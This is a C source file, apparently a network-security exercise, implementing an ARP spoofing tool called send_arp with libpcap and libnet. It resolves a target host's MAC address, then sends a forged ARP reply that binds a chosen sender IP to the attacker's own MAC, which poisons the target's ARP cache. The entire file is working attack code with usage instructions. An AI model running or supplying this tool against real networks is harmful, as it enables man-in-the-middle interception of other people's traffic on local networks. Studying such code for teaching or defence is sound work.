#include<stdio.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<libnet.h>
#include<string.h>
#include<stdlib.h>
#include<stdint.h>
#include<sys/socket.h>

#define AF_LINK AF_PACKET
#define SIZE_OF_ETHERNET 14
#define SIZE_OF_ARP 8
#define PACKET_SIZE 42

struct ip_address{
	u_char ar_sha[6];
	u_char ar_spa[4];
	u_char ar_tha[6];
	u_char ar_tpa[4];
};

pcap_t* handle;

void usage()
{
	printf("usage  : sudo ./send_arp <interface> <sender ip> <target ip>\n");
	printf("sample : sudo ./send_arp eth0 192.168.0.2 192.168.0.1\n");
}

void print_mac(uint8_t*mac)
{
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void find_target_mac(char*dev,char*my_ip, char*my_mac, char*target_ip, char*target_mac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	printf("[+]Finding Target Mac\n");
	
	struct libnet_ethernet_hdr*ethhdr=0;
	struct libnet_arp_hdr*arphdr=0;
	struct ip_address*ipaddr=0;
	u_char packet[PACKET_SIZE+1]={};
	const u_char* packet_reply=0;

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		printf("[-]Couldn't open device %s: %s\n",dev,errbuf);
		exit(1);
	}
	
	ethhdr = (struct libnet_ethernet_hdr*)packet;
	memset(ethhdr->ether_dhost,'\xff',6);
	memcpy(ethhdr->ether_shost,my_mac,6);
	ethhdr->ether_type = htons(ETHERTYPE_ARP);

	arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
	arphdr->ar_hrd = htons(ARPHRD_ETHER);
	arphdr->ar_pro = htons(ETHERTYPE_IP);
	arphdr->ar_hln = 6;
	arphdr->ar_pln = 4;
	arphdr->ar_op  = htons(ARPOP_REQUEST);

	ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
	memcpy(ipaddr->ar_sha,my_mac,6);
	inet_pton(AF_INET, my_ip, &ipaddr->ar_spa);
	memcpy(ipaddr->ar_tha,target_mac,6);
	inet_pton(AF_INET, target_ip, &ipaddr->ar_tpa);

	if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
	{
		printf("[-]Failed to send packet\n");
		exit(1);
	}

	while(true)
	{
		struct pcap_pkthdr header;
		packet_reply = pcap_next(handle,&header);
		if(packet_reply == NULL)
		{
			printf("[-]Couldn't get packet\n");
			exit(1);
		}
		
		ethhdr = (struct libnet_ethernet_hdr*)packet_reply;
		arphdr = (struct libnet_arp_hdr*)(packet_reply+SIZE_OF_ETHERNET);
		ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
		if(ethhdr->ether_type == htons(ETHERTYPE_ARP)
				&& arphdr->ar_op == htons(ARPOP_REPLY))break;
	}

	printf("[+]Success to find Target Mac\n");
	printf("[*]Target Mac  : ");
	print_mac(ipaddr->ar_sha);
	memcpy(target_mac, ipaddr->ar_sha, 6);

}

void fake_arp_reply(char*sender_ip,char*sender_mac,char*target_ip,char*target_mac)
{
	struct libnet_ethernet_hdr*ethhdr=0;
	struct libnet_arp_hdr*arphdr=0;
	struct ip_address*ipaddr=0;
	u_char packet[PACKET_SIZE+1]={};

	ethhdr = (struct libnet_ethernet_hdr*)packet;
	memcpy(ethhdr->ether_dhost,target_mac,6);
	memcpy(ethhdr->ether_shost,sender_mac,6);
	ethhdr->ether_type = htons(ETHERTYPE_ARP);
	 
	arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
	arphdr->ar_hrd = htons(ARPHRD_ETHER);
	arphdr->ar_pro = htons(ETHERTYPE_IP);
	arphdr->ar_hln = 6;
	arphdr->ar_pln = 4;
	arphdr->ar_op  = htons(ARPOP_REPLY);

	ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
	memcpy(ipaddr->ar_sha,sender_mac,6);
	inet_pton(AF_INET, sender_ip, &ipaddr->ar_spa);
	memcpy(ipaddr->ar_tha,target_mac,6);
	inet_pton(AF_INET, target_ip, &ipaddr->ar_tpa);
	 
	if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
	{
	  printf("[-]Failed to send packet\n");
	  exit(1);
	}

	printf("[+]Succes to send Fake ARP Reply\n");
}

int main(int argc, char **argv)
{
	if(argc != 4)
	{
		usage();
		return -1;
	}
	printf("[+]Send_ARP\n");
	char dev[8],errbuf[PCAP_ERRBUF_SIZE];
	uint32_t mask, net;
	struct in_addr addr;
	char myip[20],mymac[6];

	strncpy(dev,argv[1],8);
	if(dev == NULL)
	{
		printf("[-]Failed to find network device.\n");
		return -1;
	}

	printf("[*]Device Name : %s\n",dev);
	
	char senderip[20],targetip[20],targetmac[6];
	strncpy(senderip,argv[2],18);
	strncpy(targetip,argv[3],18);

	pcap_if_t *alldev;
	bool mac_ok=false,ip_ok=false;
	if(pcap_findalldevs(&alldev, errbuf)!=0)
	{
	  printf("[-]Failed to find network devices.\n");
	  return -1;
	}
	for(pcap_if_t *i=alldev; i != NULL ; i=i->next)
	{
		if(strcmp(i->name,dev))continue;
		for(pcap_addr_t *j=i->addresses; j != NULL ; j=j->next)
		{
			
			if(j->addr->sa_family == AF_INET)
			{
				strncpy(myip, inet_ntoa(((struct sockaddr_in*)j->addr)->sin_addr),18);
				ip_ok = true;
			}
			if(j->addr->sa_family == AF_LINK)
			{
				char* macaddr = (char*)j->addr->sa_data;
				macaddr+=10;
				memcpy((void*)mymac,(void*)(macaddr),6);
				mac_ok = true;
			}
			if(mac_ok&&ip_ok)break;
		}
		break;
	}
	pcap_freealldevs(alldev);

	printf("[*]My IP       : %s\n",myip);
	printf("[*]My Mac      : ");
	print_mac((uint8_t*)mymac);
	printf("[*]Sender IP   : %s\n",senderip);
	printf("[*]Target IP   : %s\n",targetip);
	puts("");
	find_target_mac(dev,myip,mymac,targetip,targetmac);
	puts("");
	fake_arp_reply(senderip,mymac,targetip,targetmac);
	puts("");
}


